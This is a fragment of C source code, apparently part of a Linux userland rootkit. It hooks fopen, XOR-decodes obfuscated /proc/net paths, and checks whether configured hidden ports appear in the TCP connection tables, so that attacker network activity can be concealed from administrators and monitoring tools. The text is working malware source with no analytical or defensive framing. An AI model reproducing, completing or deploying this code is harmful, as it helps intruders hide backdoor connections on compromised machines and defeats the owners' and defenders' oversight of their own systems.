int __attribute((visibility("hidden"))) procnet_contains_hideport(const char *pathname){
    hook(CFOPEN);

    FILE *fp = call(CFOPEN, pathname, "r");
    if(!fp) return 0;

    char *fmt = xordup(PNET_FMT);
    if(!fmt){
        fclose(fp);
        return 0;
    }

    char line[LINE_MAX];
    int rv = 0;
    u_short first_line = 1;
    while(fgets(line, sizeof(line), fp) != NULL && !rv){
        if(!first_line)
            rv = hiddenpn(getaprocnet(line, fmt));
        else first_line = 0;
    }

    clean(fmt);
    fclose(fp);
    return rv;
}

int hideport_alive(void){
    if(!initmvbc())
        return 0;

    char *pnetpath;
    int status = 0;

    pnetpath = xordup(PNET_PATH);
    if(!pnetpath) return 0;
    status = procnet_contains_hideport(pnetpath);
    clean(pnetpath);

    if(!status){
        pnetpath = xordup(PNET6_PATH);
        if(!pnetpath) return 0;
        status = procnet_contains_hideport(pnetpath);
        clean(pnetpath);
    }

    return status;
}

/* this function is now intended for things which need to check only once or twice, if a port is hidden.
 * hence, we reinitmvbc. */
int is_hidden_port(const u_short port){
    if(!reinitmvbc() || rknomore())
        return 0;
    int rv = 0;
    for(u_int i = 0; i < MAX_HIDE_PORTS && !rv; i++){
        const u_short cport = mvbc->hideports[i];
        rv = cport != 0 && port == cport;
    }
    return rv;
}

/* from procnet_t, determine if lport or rport are designated hidden ports in bc->hideports. */
int hiddenpn(const procnet_t pn){
    if(!initmvbc()) return 0;
    for(size_t i = 0; i < mvbc->portcount; i++){
        const u_short cport = mvbc->hideports[i];
        if(cport != 0 && (pn.lport == cport || pn.rport == cport))
            return 1;
    }
    return 0;
}